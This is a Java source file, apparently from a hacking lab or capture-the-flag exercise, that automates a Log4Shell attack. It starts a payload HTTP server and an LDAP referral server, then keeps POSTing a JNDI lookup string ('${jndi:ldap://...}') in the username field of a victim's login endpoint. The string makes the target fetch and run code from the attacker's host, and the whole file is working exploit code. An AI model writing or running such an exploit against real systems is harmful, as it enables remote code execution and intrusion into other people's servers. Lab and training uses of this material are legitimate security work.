import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class Launcher {
	private static final String HACKERLAB_HOST = "172.20.0.2";
	private static final String VICTIM_HOST = "repository";

	public static boolean POST_SUCCESS = false;

	public static void main(String[] args) {
		new PayloadHTTPServer().start();
		new Solver().start();
		new LDAPRefServer().start();
		new Thread(() -> {
			try {
				var first = true;
				System.err.println("🕐 Waiting for 5 seconds to get ready");
				while (!POST_SUCCESS) {
					Thread.sleep(5000);
					if (!first) {
						if (POST_SUCCESS) break;
						System.err.println("🔄 No reaction, retrying");
					}
					first = false;
					System.err.printf("🔫 POSTing Log4j payload%n");
					HttpClient client = HttpClient.newHttpClient();
					client.send(HttpRequest
						.newBuilder()
						.uri(URI.create(String.format("http://%s/auth/login", VICTIM_HOST)))
						.header("Content-Type", "application/x-www-form-urlencoded")
						.POST(HttpRequest.BodyPublishers.ofString(String.format("username=${jndi:ldap://%s/exex}&password=boof", HACKERLAB_HOST)))
						.build(), HttpResponse.BodyHandlers.ofString());
				}
			} catch (Exception e) {
				System.err.println("❗Failed: " + e.getMessage());
				throw new RuntimeException(e);
			}
		}).start();
	}
}
